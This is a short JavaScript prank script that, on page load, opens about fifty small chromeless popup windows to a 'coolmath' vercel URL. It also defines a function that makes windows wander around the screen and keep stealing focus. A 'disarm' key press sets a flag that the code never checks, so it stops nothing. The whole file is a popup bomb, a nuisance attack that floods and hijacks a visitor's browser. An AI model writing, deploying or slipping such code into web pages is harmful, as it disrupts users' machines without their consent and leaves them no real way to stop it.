var xOff = 5;
var yOff = 5;
var xPos = 400;
var yPos = 100;
var armed = true;	
	
document.addEventListener("keypress", function(event) {
  //if key pressed = 2
  if (event.keyCode == 50) {
    alert("Disarmed");
		armed = false;
  }
})

multiply();

function openWindow(url){
        aWindow = window.open(url,"https://coolmath-two.vercel.app", 'menubar=no,status=no,toolbar=noresizable=no,width=320,height=240,titlebar=no,alwaysRaised=yes');
}

function multiply(){
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');
	  openWindow('https://coolmath-two.vercel.app');

}

function goCrazy() {
    window.focus();   
    xPos = xPos + xOff;
    yPos = yPos + yOff;
    if (xPos > screen.width-175){
      xOff = Math.ceil( 0 - 6 * Math.random()) * 5 - 10;
      window.focus();
    }
    if (xPos < 0){
      xOff = Math.ceil(7 * Math.random())  * 5 - 10;
    }
    if (yPos > screen.height-100){
      yOff = Math.ceil( 0 - 6 * Math.random())  * 5 - 10;
    }
    if (yPos < 0){
      yOff = Math.ceil( 7 * Math.random())  * 5 - 10;
    }
    window.moveTo(xPos,yPos);
}
